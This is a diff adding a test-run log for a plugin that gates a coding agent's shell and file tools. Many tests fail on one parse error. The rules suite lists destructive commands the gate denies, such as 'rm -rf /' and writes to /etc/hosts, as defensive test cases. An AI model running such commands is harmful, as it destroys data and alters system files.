@@ -1,0 +1,1705 @@
+
+hooks/decide.test.ts:
+(fail) No Key: no tool is registered and no request goes out [114.98ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) With a key the tool is registered [187.50ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) A Gated Tool Call: Bash and Edit send nothing [106.78ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) What a Request Holds: the key only in the header, texts only in the body [164.31ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) Four Options With a Weak Top Choice is handed back [121.16ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) Two Options: a pick at 0.75 is returned [74.53ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) A Risky Approval is handed back whatever the pick [36.14ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) Multi-Select is handed back with no request [77.05ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) A yes/no question is answered at P(yes) 0.7 or more [191.65ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) A yes/no in the middle band is handed back [123.15ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) A Hung Server: one try of 5 s, then handed back [36.97ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) Slow Overload Replies: 3 tries and 3 s of backoff end within 18 s [59.41ms]
+  AssertionError: expect(received).toHaveLength()
+  
+  Expected: length 2
+  Received: length 0
+(fail) A 400 or 422 is tried once and the reply holds the status and 200 characters [126.08ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) An AskUserQuestion call reaches the user as sent and nothing goes to the API [130.20ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) Many questions go in one request, each keyed by its index [44.65ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(pass) A call with an empty questions list sends nothing [84.74ms]
+(fail) A 429 and then a 529 wait 1 s and 2 s, and the third try answers [137.65ms]
+  AssertionError: expect(received).toHaveLength()
+  
+  Expected: length 1
+  Received: length 0
+(fail) A 401 is not retried and the key is in no answer [26.81ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) A yes/no at P(yes) 0.7 answers yes and at 0.3 answers no, and between them goes back [100.86ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) A pick at 0.75 passes and at 0.74 goes back, and an approval at 0.2 goes back [143.86ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) the file ran to its end [0.00ms]
+  a rejection nothing handled: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+  claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+  claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+
+hooks/decide/judge.test.ts:
+(pass) a list of questions with text is taken as it is [2.91ms]
+(pass) one entry with no text voids the list [0.29ms]
+(pass) a call with no list gives none [0.17ms]
+(pass) a multi-select question and a question of one option are left out [0.23ms]
+(pass) each question is keyed by its index, so equal texts stay two decisions [0.26ms]
+(pass) a probability at the bar is returned [0.32ms]
+(pass) a probability under the bar is not [0.15ms]
+(pass) an approval that is not a confident no is not [0.12ms]
+(pass) a choice that is no option is not [0.13ms]
+(pass) a pick is named with its probability to two places [0.25ms]
+(pass) a failure gives no pick for any question [0.12ms]
+(pass) the request sends the texts, the fixed prompts, and a label where a description is empty [0.24ms]
+(pass) a yes/no question is yes at 0.7, no at 0.3 with the odds turned, and back between [0.23ms]
+(pass) a yes/no question with no answer is not answered [0.10ms]
+(pass) a probability outside 0 to 1 or not a number is no answer [0.38ms]
+(pass) a pick with no probabilities, or no answer at all, is not made [0.13ms]
+(pass) a pick with no approval answer is not made [0.13ms]
+(pass) a multi-select question is not decided even when answered [0.11ms]
+(pass) the reply asks for the unanswered ones and lists one line per question [0.18ms]
+(pass) a 429 waits and tries again, up to three tries [0.81ms]
+(pass) a 401 is not tried again [0.19ms]
+
+hooks/delegation.test.ts:
+(fail) a call typed undefined reaches the engine as claudetto:Heracles [191.58ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a call typed "" reaches the engine as claudetto:Heracles [107.23ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a call typed "general-purpose" reaches the engine as claudetto:Heracles [118.57ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a call typed "claude" reaches the engine as claudetto:Heracles [178.96ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a call typed "Explore" reaches the engine as claudetto:Artemis [208.33ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a call typed "Plan" reaches the engine as claudetto:Metis [95.53ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a call typed "Artemis" reaches the engine as claudetto:Artemis [47.48ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a call typed "claudetto:Artemis" reaches the engine as claudetto:Artemis [62.60ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a call typed "claudetto:Metis" reaches the engine as claudetto:Metis [161.00ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a call typed "claudetto:Heracles" reaches the engine as claudetto:Heracles [46.11ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a call typed "Heracles" reaches the engine as claudetto:Heracles [111.45ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) run_in_background that the caller set is kept for Artemis [101.66ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a call that needs no change reaches the engine as it was [124.00ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) fork passes through unchanged [60.62ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) statusline-setup passes through unchanged [141.52ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) claude-code-guide passes through unchanged [52.73ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) the result of an Artemis call reads as Explore [47.77ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) the result of a Heracles call keeps its agent type [167.34ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) agent.offer withholds a built-in agent and offers a plugin one [58.33ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) the Agent text picks a type from the agent list or leaves the work to the caller [55.42ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) the listing keeps only its agent lines [57.02ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) another attachment is left as it is [98.41ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) the model's own AskUserQuestion call is denied with the way out [31.59ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) ask calls the stock tool with its options and multiSelect [45.56ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) after ask returns, the stock tool is denied again [89.72ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a refused ask comes back as text, not a throw [75.43ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) the stock AskUserQuestion and Monitor go behind ToolSearch [32.43ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) the model's own Monitor call is denied with the way out [87.57ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) monitor passes a command to the stock Monitor, whose text it returns [60.41ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) monitor passes a ws source with its protocols [44.27ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a keyword search that lists Monitor lists the wrapper instead [31.57ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a search that lists neither tool is returned as it came [51.05ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a query that does not name AskUserQuestion reaches ToolSearch as it was [76.78ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a query that names AskUserQuestion is rewritten to ask [30.61ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a result that lists the stock ask lists the wrapper once [70.25ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+
+hooks/gate.test.ts:
+(fail) a shell command the gate refuses is denied over an allow, with the command in the reason [209.09ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) the engine's stricter verdict stands [74.74ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a force push is asked about, not denied [59.68ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a write to a system folder is denied for Write [236.92ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a command the gate allows is left to the engine [75.15ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) the dialog answer is a denial for a refused command [34.71ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a call denied twice is refused at the next check with the earlier reason [122.35ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a call the classifier denied twice with no reason is reported with the ! form [144.53ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a denied call is retried once, then left denied [75.25ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a denial with no reason is not retried [33.10ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a message from the person lets the same call reach its check again [23.08ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a secret the scanner finds in a tool result reaches the model as [REDACTED] [166.23ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a result with no secret comes back as it was [86.63ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) an errored result with a secret reaches the model redacted, as a deny [84.64ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a missing scanner withholds the result and names the install step [133.83ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a WebFetch, an MCP tool, and a Skill request are passed on with no allow [44.15ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a request the rules only ask about gets no allow from the dialog [25.03ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a dialog denial carries the command [157.93ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) Write of a system path is held at tool.check [84.56ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) Edit of a system path is held at tool.check [63.57ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) NotebookEdit of a system path is held at tool.check [140.34ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a gate that fails holds the call for a person [86.46ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) the same tool with another input is not refused after two denials [88.42ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a task notification after two denials leaves the call refused [29.53ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) the denial hook answers retry alone, never a decision [26.05ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a push to a URL or a remote is left to the engine [27.43ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) bun.lock in the repo denies npm and names the bun form [123.62ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a Monitor command the gate refuses is denied like a Bash one [77.37ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) autoMode in the settings changes no tool.check verdict of the gate [63.36ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a rule denial of the engine names the rule beside its own text [27.55ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a denial with no rule keeps the engine's text [110.15ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) `.env` as text in a pattern or a quoted name is not read as an env-file read [48.86ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a copy to a file the session saw and that is gone now asks [55.57ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a Write of a file never seen passes [44.53ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) recreating a file after the session's own rm passes [49.47ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a Write over a file that exists passes [92.34ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a copy over a path the session saw, with a relative and an absolute spelling, asks [81.18ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) an rm and a cp of the same path in one command passes [34.97ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+
+hooks/gate/denials.test.ts:
+(pass) a call with no JSON form still has a signature [1.40ms]
+(pass) a repeated denial with reason "" is unexplained [0.27ms]
+(pass) a repeated denial with reason "   " is unexplained [0.16ms]
+(pass) a repeated denial with reason "\n" is unexplained [0.20ms]
+(pass) a repeated denial with reason "(it gave no explanation)" is unexplained [0.16ms]
+(pass) a repeated denial with reason "blocked" is explained [0.18ms]
+(pass) a repeated denial with reason "not allowed here" is explained [0.16ms]
+
+hooks/gate/packages.test.ts:
+(pass) the policy files are the lockfiles, the deno files, and the build files [1.62ms]
+(pass) npm install in a bun repo points to bun install [0.45ms]
+(pass) npm i in a bun repo points to bun install [0.19ms]
+(pass) npm ci in a bun repo points to bun install --frozen-lockfile [0.20ms]
+(pass) npm add in a bun repo points to bun add [0.12ms]
+(pass) npm uninstall in a bun repo points to bun remove [0.12ms]
+(pass) npm remove in a bun repo points to bun remove [0.12ms]
+(pass) npm rm in a bun repo points to bun remove [0.12ms]
+(pass) npm update in a bun repo points to bun update [0.11ms]
+(pass) npm up in a bun repo points to bun update [0.11ms]
+(pass) npm upgrade in a bun repo points to bun update [0.10ms]
+(pass) npm run in a bun repo points to bun run [0.09ms]
+(pass) npm task in a bun repo points to bun run [0.10ms]
+(pass) npm run-script in a bun repo points to bun run [0.09ms]
+(pass) npm test in a bun repo points to bun run test [0.09ms]
+(pass) npm t in a bun repo points to bun run test [0.09ms]
+(pass) npm exec in a bun repo points to bunx [0.11ms]
+(pass) npm dlx in a bun repo points to bunx [0.11ms]
+(pass) npm x in a bun repo points to bunx [0.12ms]
+(pass) npm view in a bun repo points to bun info [0.11ms]
+(pass) npm info in a bun repo points to bun info [0.11ms]
+(pass) npm frobnicate in a bun repo points to the matching `bun` command (`bun --help`) [0.11ms]
+(pass) npm with no verb means install, and a second word means add [0.23ms]
+(pass) flags are skipped when the verb is read [0.17ms]
+(pass) npx and pnpx point to bunx, and bun.lockb counts as a bun lock [0.20ms]
+(pass) a repo without a bun lock allows npm [0.12ms]
+(pass) deno install in a bun repo without deno files is denied [0.13ms]
+(pass) deno install after a flag in a bun repo is denied [0.11ms]
+(pass) deno add in a bun repo without deno files is denied [0.10ms]
+(pass) deno add after a flag in a bun repo is denied [0.10ms]
+(pass) deno remove in a bun repo without deno files is denied [0.09ms]
+(pass) deno remove after a flag in a bun repo is denied [0.10ms]
+(pass) deno task in a bun repo without deno files is denied [0.11ms]
+(pass) deno task after a flag in a bun repo is denied [0.10ms]
+(pass) deno x in a bun repo without deno files is denied [0.11ms]
+(pass) deno x after a flag in a bun repo is denied [0.11ms]
+(pass) deno names the bun form of its verb [0.14ms]
+(pass) deno is allowed when the repo has deno.json [0.12ms]
+(pass) deno is allowed when the repo has deno.jsonc [0.13ms]
+(pass) deno is allowed when the repo has deno.lock [0.14ms]
+(pass) deno verbs outside the package set are allowed [0.15ms]
+(pass) cmake in an xmake repo points to xmake [0.11ms]
+(pass) cmake is allowed in a repo without xmake.lua [0.09ms]
+(pass) ninja in an xmake repo points to xmake [0.09ms]
+(pass) ninja is allowed in a repo without xmake.lua [0.07ms]
+(pass) make in an xmake repo points to xmake [0.10ms]
+(pass) make is allowed in a repo without xmake.lua [0.08ms]
+(pass) conan in an xmake repo points to xmake [0.10ms]
+(pass) conan is allowed in a repo without xmake.lua [6.58ms]
+(pass) cmake is allowed in an xmake repo that has CMakeLists.txt [2.19ms]
+(pass) ninja is allowed in an xmake repo that has build.ninja [0.13ms]
+(pass) make is allowed in an xmake repo that has Makefile [0.24ms]
+(pass) make is allowed in an xmake repo that has makefile [0.10ms]
+(pass) make is allowed in an xmake repo that has GNUmakefile [0.20ms]
+(pass) conan is allowed in an xmake repo that has conanfile.py [0.12ms]
+(pass) conan is allowed in an xmake repo that has conanfile.txt [0.12ms]
+
+hooks/gate/refs.test.ts:
+(pass) git fetch -q origin main && git reset --soft FETCH_HEAD asks and names the hash form [87.48ms]
+(pass) git reset FETCH_HEAD asks and names the hash form [3.05ms]
+(pass) git reset --soft 8ec2d966 asks and names the hash form [0.41ms]
+(pass) git -C /tmp/r reset --mixed origin/main asks and names the hash form [0.27ms]
+(pass) git reset --keep release/0.3.0 asks and names the hash form [0.25ms]
+(pass) git update-ref refs/heads/main 8ec2d966 asks and names the hash form [0.24ms]
+(pass) git branch -f main 8ec2d966 asks and names the hash form [0.26ms]
+(pass) git branch --force main HEAD~2 asks and names the hash form [0.23ms]
+(pass) sh -c 'git reset --soft ORIG_HEAD' asks and names the hash form [0.43ms]
+(pass) git reset passes [0.25ms]
+(pass) git reset --soft passes [0.25ms]
+(pass) git reset --soft HEAD~1 passes [0.17ms]
+(pass) git reset --mixed HEAD^ passes [0.17ms]
+(pass) git reset --soft @~2 passes [0.18ms]
+(pass) git reset src/a.ts passes [0.16ms]
+(pass) git reset -- src/a.ts passes [0.16ms]
+(pass) git reset HEAD -- src/a.ts passes [0.17ms]
+(pass) git branch feature passes [0.17ms]
+(pass) git branch -d old passes [0.16ms]
+(pass) git rev-parse origin main passes [0.17ms]
+(pass) echo git reset --soft FETCH_HEAD passes [0.16ms]
+
+hooks/gate/rules.test.ts:
+(pass) denies rm -rf / [14.15ms]
+(pass) denies sh -c 'rm -rf /' [0.55ms]
+(pass) denies echo hi > /etc/hosts [0.31ms]
+(pass) denies echo hi | tee /etc/hosts [0.25ms]
+(pass) denies cat > notes.txt [0.18ms]
+(pass) denies tee notes.txt [0.15ms]
+(pass) denies printf 'a' > notes.txt [0.17ms]
+(pass) denies cat <<EOF > notes.txt\u000aa\u000aEOF [0.19ms]
+(pass) denies cat src/a.ts [0.13ms]
+(pass) denies head -n 5 src/a.ts [0.13ms]
+(pass) denies tail src/a.ts [0.13ms]
+(pass) denies sed -n '1,5p' src/a.ts [0.18ms]
+(pass) passes git show HEAD:src/a.ts [0.23ms]
+(pass) passes rg foo src [0.14ms]
+(pass) passes cat src/a.ts | wc -l [0.17ms]
+(pass) passes head -n 5 src/a.ts | grep x [0.18ms]
+(pass) passes ls -la [0.13ms]
+(pass) a file print is told to use Read, a whole-file write to use Write [0.35ms]
+(pass) an unreadable command asks [0.17ms]
+(pass) bun.lock denies npm install naming bun install [0.23ms]
+(pass) bun.lock denies npm i left-pad naming bun add [0.18ms]
+(pass) bun.lock denies npx tsc naming bunx [0.17ms]
+(pass) bun.lock denies yarn add zod naming bun add [0.17ms]
+(pass) bun.lock denies pnpm run build naming bun run [0.17ms]
